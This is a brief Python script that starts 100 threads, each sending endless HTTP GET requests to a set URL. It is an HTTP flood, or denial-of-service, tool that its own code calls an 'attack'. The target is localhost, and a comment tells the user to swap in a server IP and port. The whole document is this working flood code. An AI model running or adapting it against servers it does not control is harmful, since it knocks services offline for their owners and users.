import requests
import threading

url = "http://127.0.0.1:3000"  #your server IP and port

def attack():
    while True:
        try:
            requests.get(url)
        except:
            pass

# Launch 100 attack threads
for i in range(100):  
    threading.Thread(target=attack).start()